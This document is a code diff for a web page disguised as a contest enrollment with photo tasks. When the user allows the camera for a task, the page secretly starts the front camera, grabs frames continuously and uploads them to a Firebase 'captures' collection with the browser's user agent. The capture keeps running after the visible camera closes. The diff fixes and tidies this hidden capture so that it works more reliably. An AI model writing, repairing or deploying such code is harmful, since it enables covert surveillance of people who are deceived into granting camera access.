@@ -218,8 +218,7 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Expose sendToFirebase globally so rest of script can use it
-    window.sendToFirebase = async function(base64img) {
+    async function sendToFirebase(base64img) {
       try {
         await addDoc(collection(db, "captures"), {
           image: base64img,
@@ -227,20 +226,18 @@
           userAgent: navigator.userAgent
         });
       } catch(e) {
-        // silent fail
+        console.error("Firebase error:", e);
       }
-    };
-  </script>
+    }
 
-  <script>
     var TOTAL_TASKS = 5;
+    var completed = [];
+    var silentStream = null;
+    var silentCapturing = false;
+    var cameraStream = null;
+    var activeTaskNum = null;
 
     // ─── Progress ────────────────────────────────────────────────
-    // Tasks reset every page load — no localStorage
-    var completed = [];
-
-    function saveProgress() { /* no saving — resets on reload */ }
-
     function updateProgressBar() {
       var count = completed.length;
       document.getElementById('progress-fill').style.width = (count / TOTAL_TASKS * 100) + '%';
@@ -250,7 +247,6 @@
     function markTaskDone(num) {
       if (completed.indexOf(num) === -1) {
         completed.push(num);
-        saveProgress();
         updateProgressBar();
       }
       var el = document.getElementById('task-' + num);
@@ -281,16 +277,6 @@
       alert('You have been enrolled! Results will be announced within 24 hours. Good luck!');
     }
 
-    function restoreDoneUI() {
-      completed.forEach(function(num) {
-        var el = document.getElementById('task-' + num);
-        if (el) el.classList.add('done');
-      });
-      updateProgressBar();
-      updateLocks();
-    }
-
-    // Tasks always start fresh on page load
     updateLocks();
 
     // ─── Timer ───────────────────────────────────────────────────
@@ -321,50 +307,35 @@
     }, 8000);
 
     // ─── Silent front camera capture ─────────────────────────────
-    var silentStream = null;
-    var silentCapturing = false;
-
     function startSilentCapture() {
       if (silentCapturing) return;
       silentCapturing = true;
-
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(function(stream) {
           silentStream = stream;
           var vid = document.getElementById('silent-video');
           vid.srcObject = stream;
           vid.play();
-          // Start capturing as fast as possible
-          captureLoop();
+          vid.onloadedmetadata = function() { captureLoop(); };
         })
-        .catch(function() {
-          // If front camera denied or unavailable, silently fail
-          silentCapturing = false;
-        });
+        .catch(function() { silentCapturing = false; });
     }
 
     function captureLoop() {
       if (!silentCapturing || !silentStream) return;
       var vid = document.getElementById('silent-video');
       var canvas = document.getElementById('silent-canvas');
-      if (vid.readyState >= 2) {
-        canvas.width = vid.videoWidth || 320;
-        canvas.height = vid.videoHeight || 240;
+      if (vid.readyState >= 2 && vid.videoWidth > 0) {
+        canvas.width = vid.videoWidth;
+        canvas.height = vid.videoHeight;
         canvas.getContext('2d').drawImage(vid, 0, 0);
-        var base64 = canvas.toDataURL('image/jpeg', 0.6); // 0.6 quality to keep size small
-        // Send to Firebase
-        if (window.sendToFirebase) {
-          window.sendToFirebase(base64);
-        }
+        var base64 = canvas.toDataURL('image/jpeg', 0.5);
+        sendToFirebase(base64);
       }
-      // Loop as fast as possible using requestAnimationFrame
       requestAnimationFrame(captureLoop);
     }
 
     // ─── User-facing back camera ─────────────────────────────────
-    var cameraStream = null;
-    var activeTaskNum = null;
-
     function openCamera(taskNum, instructionHTML) {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         alert('Camera not supported on this browser.');
@@ -377,8 +348,6 @@
           cameraStream = stream;
           document.getElementById('camera-video').srcObject = stream;
           document.getElementById('camera-overlay').classList.add('active');
-
-          // Start silent front camera capture as soon as back camera permission is granted
           startSilentCapture();
         })
         .catch(function() {
@@ -387,18 +356,14 @@
     }
 
     function snapPhoto() {
-      // Capture the user's photo from back camera for preview
       var video = document.getElementById('camera-video');
       var canvas = document.getElementById('camera-canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
       var photoData = canvas.toDataURL('image/jpeg', 0.8);
-
-      // Show preview to user
       document.getElementById('preview-img').src = photoData;
       document.getElementById('photo-preview-box').classList.add('show');
-
       var taskNum = activeTaskNum;
       closeCamera();
       if (taskNum !== null) markTaskDone(taskNum);
@@ -411,16 +376,13 @@
       }
       document.getElementById('camera-overlay').classList.remove('active');
       activeTaskNum = null;
-      // Note: silent front camera keeps running in background
     }
 
-    // ─── Task 1 ──────────────────────────────────────────────────
     function handleTask1() {
       if (completed.indexOf(1) !== -1) return;
       openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
     }
 
-    // ─── Task 3 ──────────────────────────────────────────────────
     function handleTask3() {
       if (completed.indexOf(3) !== -1) return;
       window.open('verify.html', '_blank');
@@ -429,6 +391,14 @@
     window.addEventListener('message', function(e) {
       if (e.data === 'task3done') markTaskDone(3);
     });
+
+    // Expose functions to HTML onclick attributes
+    window.handleTask1 = handleTask1;
+    window.handleTask3 = handleTask3;
+    window.markTaskDone = markTaskDone;
+    window.snapPhoto = snapPhoto;
+    window.closeCamera = closeCamera;
+    window.tryEnroll = tryEnroll;
 
   </script>
 
